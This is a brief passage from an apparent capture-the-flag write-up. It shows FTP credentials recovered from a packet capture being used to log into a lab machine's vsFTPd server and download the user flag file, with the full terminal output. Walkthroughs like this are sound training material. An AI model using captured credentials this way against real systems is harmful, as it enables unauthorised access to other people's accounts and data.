Using ftp credentials recovered from 0.pcap
- nathan
- `B<SNIP>3!`

```
└─$ ftp nathan@10.10.10.245   
Connected to 10.10.10.245.
220 (vsFTPd 3.0.3)
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||15159|)
150 Here comes the directory listing.
-r--------    1 1001     1001           33 Sep 26 22:13 user.txt
226 Directory send OK.
ftp> get user.txt
local: user.txt remote: user.txt
229 Entering Extended Passive Mode (|||62651|)
150 Opening BINARY mode data connection for user.txt (33 bytes).
100% |********************************|    33      325.52 KiB/s    00:00 ETA
226 Transfer complete.
33 bytes received in 00:00 (0.68 KiB/s)

```